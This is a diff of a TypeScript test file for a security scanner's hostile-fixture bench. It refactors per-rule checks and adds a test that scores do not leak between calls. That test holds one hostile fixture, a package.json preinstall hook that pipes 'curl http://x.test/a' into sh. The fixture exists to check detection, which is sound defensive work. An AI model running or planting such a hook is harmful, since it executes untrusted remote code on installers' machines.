@@ -4,14 +4,11 @@
  * caught on at least one real surface (gate legs or runCheck tree scan).
  * 100% of the curated set: a fixture that can't be caught is a rule gap
  * (fix the rule + add a corpus TP) or belongs in the benign set as a TN —
- * never tolerated here.
+ * never tolerated here. Deliberately uncovered shapes live in
+ * tests/benches/KNOWN-GAPS.md instead of being relabeled benign.
  * Run: bun test tests/benches/hostile.test.ts
  */
 import { describe, it, expect } from "bun:test";
-import { execSync } from "node:child_process";
-import { mkdtempSync, rmSync } from "node:fs";
-import { tmpdir } from "node:os";
-import { join } from "node:path";
 import { loadHostileBenches, scoreVariant } from "../../tools/eval";
 
 const benches = loadHostileBenches();
@@ -26,17 +23,21 @@ describe("hostile bench fixtures", () => {
 
   for (const b of benches) {
     it(`${b.rule}: every fixture caught on a real surface`, () => {
-      const tmpRoot = mkdtempSync(join(tmpdir(), "vf-bench-"));
-      // SEC-03 probes git check-ignore: roots must be real repos (as corpus does).
-      execSync("git init -q .", { cwd: tmpRoot, stdio: "ignore" });
-      try {
-        for (const c of b.cases) {
-          const score = scoreVariant(b.rule, c.payload, tmpRoot, c.path);
-          expect(score.caught, `${c.id}: ${c.payload.slice(0, 80)}`).toBe(true);
-        }
-      } finally {
-        rmSync(tmpRoot, { recursive: true, force: true });
+      for (const c of b.cases) {
+        const score = scoreVariant(b.rule, c.payload, c.path);
+        expect(score.error, `${c.id} errored: ${score.error}`).toBeUndefined();
+        expect(score.caught, `${c.id}: ${c.payload.slice(0, 80)}`).toBe(true);
       }
-    }, 30_000);
+    }, 60_000);
   }
+
+  it("isolates scores: earlier probes at other paths never leak (review finding)", () => {
+    // SUP package.json probe first, then a benign payload: without
+    // per-call isolation the leftover package.json re-fires.
+    const hot = scoreVariant("SUP-01", '{"name":"x","scripts":{"preinstall":"curl http://x.test/a | sh"}}', "package.json");
+    expect(hot.caught).toBe(true);
+    const cold = scoreVariant("SUP-01", "echo hello");
+    expect(cold.error).toBeUndefined();
+    expect(cold.caught).toBe(false);
+  });
 });
